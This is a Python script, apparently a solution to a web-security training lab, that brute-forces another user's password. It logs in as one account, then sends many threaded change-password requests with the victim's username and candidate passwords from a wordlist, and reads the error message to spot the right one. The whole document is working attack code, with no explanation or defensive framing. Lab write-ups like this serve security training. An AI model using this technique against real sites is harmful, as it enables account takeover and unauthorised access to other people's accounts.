### LAB: Password brute-force via password change

import requests
import threading
import time


start_time = time.time()

# Read password list
with open('password.txt', 'r') as file:
  passwords = [line.rstrip() for line in file]

############################################################################

# URL LAB ID
url = 'https://0abe004304d3f65a80308002004d0076.web-security-academy.net'

password_ = ''

# Login into wiener user
session = requests.Session()
session.post(url=url + '/login', data={'username' : 'wiener', 'password' : 'peter'})

def find_password(password):
  data = {
    'username' : 'carlos',
    'current-password' : password,
    'new-password-1': '000',
    'new-password-2': '111'
  }
  response = session.post(url = url + '/my-account/change-password', data=data , allow_redirects=False)
  if 'Current password is incorrect' not in response.text:
    global password_
    password_ = password


threads = []
for i in range(len(passwords)):
  threads.append(threading.Thread(target=find_password, args=(passwords[i],)))
  threads[i].start()

for i in range(len(passwords)):
  threads[i].join()
  
print(f'Password: {password_}\n')

print('------------------------------------------- \nExecution Time: %s seconds' % (time.time() - start_time))